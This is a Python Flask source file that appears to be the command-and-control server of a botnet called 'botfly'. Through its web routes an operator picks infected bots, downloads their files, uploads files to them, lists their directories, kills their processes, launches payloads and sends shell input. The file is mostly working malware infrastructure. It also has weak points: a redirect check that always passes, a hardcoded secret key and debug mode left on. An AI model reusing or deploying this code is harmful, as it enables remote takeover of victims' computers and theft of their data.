import eventlet
eventlet.monkey_patch()

import os
import socket
import flask
from flask import request
import flask_login
from flask_login import LoginManager, login_required
from flask_socketio import SocketIO
import json
from OpenSSL import SSL, crypto


# Loading library depends on how we want to setup the project later,
# for now this will do
try:
    from server.botnetclasses import BotNet
    from server.botnetserver import BotServer
    from server.serverclasses import UserManager
except:
    from botnetclasses import BotNet
    from botnetserver import BotServer
    from serverclasses import UserManager

''' See accompanying README for TODOs.

 To run: python server.py'''

HOSTNAME = 'botfly'
HOST = '0.0.0.0'
PORT = 1708
UPLOAD_FOLDER = 'static/uploads/'
DOWNLOAD_FOLDER = 'media/downloads/'

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = flask.Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None

# Login stuff
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

@login_manager.user_loader
def load_user(user_id):
    return UserManager.get(user_id)

@app.route('/login', methods=['GET', 'POST'])
def login():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    errs = []
    if request.method=='POST':
        uname = request.form.get('username')
        passwd = request.form.get('password')

        if UserManager.validate(uname,passwd):
            user = UserManager.getbyname(uname)
            flask_login.login_user(user)

            flask.flash('Logged in successfully.')

            next = flask.request.args.get('next')
            # is_safe_url should check if the url is safe for redirects.
            # See http://flask.pocoo.org/snippets/62/ for an example.
            if not is_safe_url(next):
                return flask.abort(400)
            return flask.redirect(next or flask.url_for('index'))
        else:
            errs.append("Invalid login")
    return flask.render_template('login.html',errors=errs)

@app.route("/logout")
@login_required
def logout():
    flask_login.logout_user()
    return flask.redirect('/login')

# Research more
def is_safe_url(next):
    return True

# Done with login stuff

@app.route('/kill', methods=['POST','GET'])
@login_required
def kill_proc():
    if 'bot' in request.cookies:
        botnet.sendKillProc(request.cookies.get('bot'))
        return json.dumps({"success": True})
    return json.dumps({"success": False})

@app.route('/uploader', methods=['POST'])
@login_required
def upload_file():
    f = request.files['file']
    # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
    if 'bot' in request.cookies:
        botnet.sendFile(request.cookies.get('bot'),f.filename,f)
        return json.dumps({"success": True})
    return json.dumps({"success": False})
    # TODO switch to in-progress instead of "success"



@app.route('/downloader', methods=['GET','POST','DELETE'])
@login_required
def download_file():
    '''
    POST: make the client start sending file to server
    GET:  get json list of all files currently on server
          if query parameter "file" specified then instead download
          that file from server
    '''
    if request.method == 'POST':
        filename = request.form.get('file')
        if 'bot' in request.cookies:
            botnet.startFileDownload(request.cookies.get('bot'), filename)
            return "done"
        else:
            return "No bot selected", 404
    elif request.method == 'GET':
        if 'file' in request.args:
            if 'user' in request.args:
                user = request.args.get('user')
            else:
                user = request.cookies.get('bot')
            filename = request.args.get('file')

            real_filename = botnet.getFileName(user,filename)
            if real_filename:
                return flask.send_file(real_filename,attachment_filename=os.path.basename(filename))
            else:
                return "File not found", 404
        else:
            filestr = json.dumps(botnet.getDownloadFiles())
            return flask.Response(filestr, status=200, mimetype='application/json')
    elif request.method == 'DELETE':
        if 'file' in request.args:
            if 'user' in request.args:
                user = request.args.get('user')
            else:
                user = request.cookies.get('bot')
            filename = request.args.get('file')
            if botnet.deleteFile(user,filename):
                return "done"
            else:
                return "File not found", 404
        else:
            return "No file selected", 404


@app.route('/payload', methods=['GET', 'POST'])
@login_required
def payload_launch():
    if request.method == 'POST' and 'payload' in request.form:
        payload_name = request.form.get('payload')
        if 'bot' in request.cookies:
            botnet.sendPayload(request.cookies.get('bot'), payload_name, request.form.to_dict())
            return "done"
        else:
            return "No bot selected", 404
    elif request.method == 'GET':
        payloadstr = json.dumps(botnet.getPayloads())
        return flask.Response(payloadstr, status=200, mimetype='application/json')

@app.route('/ls', methods=['GET','POST'])
@login_required
def list_dir():
    if request.method == 'POST' and 'file' in request.form:
        filename = request.form.get('file')
    else:
        filename = '.'
    if 'bot' in request.cookies:
        botnet.requestLs(request.cookies.get('bot'), filename)
        return "done"
    else:
        return "No bot selected", 404

@app.route('/choose', methods=['POST'])
@login_required
def setbot():
    resp = flask.Response("done")
    if 'bot' in request.form:
        resp.set_cookie('bot', request.form.get('bot'))
    return resp

@app.route('/index')
@app.route('/')
@login_required
def index():
    connected = ''
    if 'bot' in request.cookies:
        connected = request.cookies.get('bot')
    resp = flask.make_response(flask.render_template('index.html',
                                         async_mode=socketio.async_mode,
                                         bot_list=botnet.getConnections(),
                                         payload_list=botnet.getPayloadNames(),
                                         connected=connected))
    if request.method == 'POST':
        resp.set_cookie('bot',request.form.get('bot'))
    return resp

@app.route('/log', methods=['POST'])
@login_required
def resend_log():
    if request.method == 'POST':
        connected = ''
        if 'user' in request.form:
            connected = request.form.get('user')
        elif 'bot' in request.cookies:
            connected = request.cookies.get('bot')
        filestr = json.dumps(botnet.getLog(connected))
        return flask.Response(filestr, status=200, mimetype='application/json')
    return "done"

@app.route('/finder')
@login_required
def finder():
    connected = ''
    if 'bot' in request.cookies:
        connected = request.cookies.get('bot')
    return flask.render_template('finder.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                                         connected=connected)


@socketio.on('send_command', namespace='/bot')
def send_command(cmd):
    if 'bot' in request.cookies:
        botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')

# Crypto stuff
def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
    if not os.path.isdir(cert_dir):
        os.mkdir(cert_dir)
    C_F = os.path.join(cert_dir, certfile)
    K_F = os.path.join(cert_dir, keyfile)
    if not os.path.exists(C_F) or not os.path.exists(K_F):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 1024)
        cert = crypto.X509()
        cert.get_subject().C = certargs["Country"]
        cert.get_subject().ST = certargs["State"]
        cert.get_subject().L = certargs["City"]
        cert.get_subject().O = certargs["Organization"]
        cert.get_subject().OU = certargs["Org. Unit"]
        cert.get_subject().CN = HOSTNAME
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(315360000)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha1')
        open(C_F, "wb").write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))

    botnet = BotNet(socketio,downloadpath=DOWNLOAD_FOLDER)
    botserver = BotServer(TCPSOCK, botnet, socketio)

    botnet.start()
    botserver.start()

    USE_SSL = False
    if USE_SSL:
        CERT_DIR = "cert"
        CERT_FILE = "cert.pem"
        KEY_FILE = "key.pem"
        create_self_signed_cert(CERT_FILE, KEY_FILE,
                                certargs=
                                {"Country": "US",
                                 "State": "NY",
                                 "City": "Ithaca",
                                 "Organization": "CHC",
                                 "Org. Unit": "Side-Projects"},
                                cert_dir=CERT_DIR)
        CERT_FILE = os.path.join(CERT_DIR,CERT_FILE)
        KEY_FILE = os.path.join(CERT_DIR,KEY_FILE)
        socketio.run(app, debug=True, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=5500)
    else:
        socketio.run(app, debug=True, use_reloader=False, port=5500)